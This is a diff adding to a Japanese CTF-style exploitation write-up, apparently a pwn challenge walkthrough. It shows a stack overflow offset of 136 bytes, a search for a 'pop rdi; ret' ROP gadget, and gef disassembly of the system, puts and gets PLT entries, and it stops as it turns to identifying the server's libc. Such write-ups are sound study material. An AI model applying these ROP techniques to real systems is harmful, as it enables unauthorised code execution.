@@ -73,3 +73,44 @@ gef> pattern search 0x6161616161616172
 ```
 
 上の結果から、**136バイト**埋めるとその次に **$rsp** の値を任意の値に書き換えられる
+ここからROPガジェットを使って任意の命令を実行していく
+
+```console
+gef> ropper --search '% ?di'
+(snip)
+0x0000000000400763: pop rdi; ret;
+gef> info functions
+(snip)
+0x0000000000400520  puts@plt
+0x0000000000400530  setbuf@plt
+0x0000000000400540  system@plt
+0x0000000000400550  printf@plt
+0x0000000000400560  __libc_start_main@plt
+0x0000000000400570  gets@plt
+gef> disas 0x0000000000400540
+Dump of assembler code for function system@plt:
+   0x0000000000400540 <+0>:	jmp    QWORD PTR [rip+0x200ae2]        # 0x601028
+   0x0000000000400546 <+6>:	push   0x2
+   0x000000000040054b <+11>:	jmp    0x400510
+End of assembler dump.
+
+gef> disas 0x0000000000400520
+Dump of assembler code for function puts@plt:
+   0x0000000000400520 <+0>:	jmp    QWORD PTR [rip+0x200af2]        # 0x601018
+   0x0000000000400526 <+6>:	push   0x0
+   0x000000000040052b <+11>:	jmp    0x400510
+End of assembler dump.
+
+gef> disas 0x0000000000400570
+Dump of assembler code for function gets@plt:
+   0x0000000000400570 <+0>:	jmp    QWORD PTR [rip+0x200aca]        # 0x601040
+   0x0000000000400576 <+6>:	push   0x5
+   0x000000000040057b <+11>:	jmp    0x400510
+End of assembler dump.
+
+```
+
+
+まずサーバの*libc*を調べる
+
+
